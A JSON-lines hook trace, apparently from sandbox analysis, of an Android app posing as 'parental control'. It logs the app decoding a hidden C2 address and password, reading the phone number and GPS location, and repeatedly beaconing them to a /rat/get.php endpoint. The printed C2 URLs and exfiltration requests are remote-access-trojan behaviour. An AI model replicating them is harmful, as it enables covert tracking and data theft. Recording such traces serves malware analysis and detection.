{"timestamp":1520989507817,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache"},"args":[]}
{"timestamp":1520989507824,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache"},"args":[]}
{"timestamp":1520989507841,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache\/com.android.renderscript.cache"},"args":[]}
{"timestamp":1520989507871,"result":{"mClass":"com.connect.MyService","mPackage":"com.parental.control.v4"},"class":"android.content.ContextWrapper","method":"startService","type":"binder","args":[{"cmp":"com.parental.control.v4\/com.connect.MyService"}]}
{"timestamp":1520989507902,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1520989507916,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1520989507920,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1520989507927,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1520989507951,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/vendor\/lib\/libmedia_jni.so"},"args":[]}
{"timestamp":1520989507954,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/system\/lib\/libmedia_jni.so"},"args":[]}
{"timestamp":1520989507987,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":["com.connect.ServiceReceiver@410a0710",{"mPriority":0,"mActions":["android.intent.action.BOOT_COMPLETED","android.intent.action.SCREEN_OFF"],"mHasPartialTypes":false}]}
{"timestamp":1520989508014,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":["com.connect.ServiceReceiver@410a0710",{"mPriority":0,"mActions":["android.intent.action.BOOT_COMPLETED","android.intent.action.SCREEN_OFF"],"mHasPartialTypes":false}]}
{"timestamp":1520989508103,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508107,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508125,"result":{"mModified":{"inacall":0},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putLong","type":"globals","args":["inacall","0"]}
{"timestamp":1520989508131,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508145,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508167,"result":{"mModified":{"Timeout":10000},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putInt","type":"globals","args":["Timeout","10000"]}
{"timestamp":1520989508171,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508178,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508188,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508203,"result":{"mModified":{"RecordCalls":true},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["RecordCalls","true"]}
{"timestamp":1520989508207,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508215,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508223,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508239,"result":{"mModified":{"intercept":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["intercept","false"]}
{"timestamp":1520989508242,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508255,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508259,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508274,"result":{"mModified":{"AndroidID":"5056ad7d6c8edd62"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["AndroidID","5056ad7d6c8edd62"]}
{"timestamp":1520989508278,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508291,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508321,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508327,"result":{"mModified":{"File":"\/mnt\/sdcard\/System"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["File","\/mnt\/sdcard\/System"]}
{"timestamp":1520989508355,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508368,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508382,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508388,"result":{"mModified":{"urlPost":"\/message.php?"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["urlPost","\/message.php?"]}
{"timestamp":1520989508397,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508410,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508414,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508429,"result":{"mModified":{"backupURL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["backupURL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1520989508433,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508447,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508451,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508484,"result":{"mModified":{"Start":true},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Start","true"]}
{"timestamp":1520989508541,"result":{"mModified":{"Media":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Media","false"]}
{"timestamp":1520989508565,"result":{"mModified":{"Files":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Files","false"]}
{"timestamp":1520989508584,"result":"","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.print_config",""]}
{"timestamp":1520989508590,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508615,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508635,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508675,"result":{"mModified":{"URL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1520989508741,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989508744,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989508779,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989508887,"result":{"mModified":{"backupURL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["backupURL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1520989508912,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989509000,"result":{"mModified":{"password":"a2V5bGltZXBpZQ=="},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["password","a2V5bGltZXBpZQ=="]}
{"timestamp":1520989509131,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989509145,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989509191,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989509209,"result":{"mModified":{"androidId":"5056ad7d6c8edd62"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["androidId","5056ad7d6c8edd62"]}
{"timestamp":1520989509225,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1520989509238,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1520989509252,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1520989509283,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989509288,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989509310,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989509333,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0","16","0"]}
{"timestamp":1520989509341,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0"]}
{"timestamp":1520989509362,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0"]}
{"timestamp":1520989509395,"result":["CONNECTING","CONNECTED","SUSPENDED","DISCONNECTING","DISCONNECTED","UNKNOWN"],"hooked_method":"values","hooked_class":"","args":[],"class":"java.lang.reflect.Method","method":"invoke","type":"reflection"}
{"timestamp":1520989509418,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989509427,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989509454,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989509479,"result":"America\/New_York","class":"android.os.SystemProperties","method":"get","type":"content","args":["persist.sys.timezone"]}
{"timestamp":1520989509633,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989509992,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989509952,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989510093,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989510107,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989510115,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989510125,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989510164,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989510438,"result":{"descriptor":57},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/system\/etc\/security\/cacerts\/9772ca32.0","0"]}
{"timestamp":1520989510507,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/misc\/keychain\/cacerts-removed\/9772ca32.0"},"args":[]}
{"timestamp":1520989510897,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=78&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989510903,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=78&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989510940,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=78&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989510963,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989510955,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989527067,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989527071,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989527091,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989527113,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989527121,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989527138,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989527171,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989527111,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989527192,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989527211,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989527220,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989527243,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989527262,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989527737,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=991&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989527742,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=991&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989527762,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=991&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989527767,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989527766,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989543840,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989543872,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989543901,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989543931,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989543946,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989544005,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989544055,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989543930,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989544102,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989544131,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989544139,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989544159,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989544182,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989544771,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=32&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989544776,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=32&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989544790,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=32&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989544808,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989544795,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989560912,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989560915,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989560929,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989560942,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989560950,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989560959,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989560982,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989560942,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989561015,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989561031,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989561049,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989561039,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989561066,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989561439,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=296&Password=keylimepie HTTP\/1.1\n\n"]}
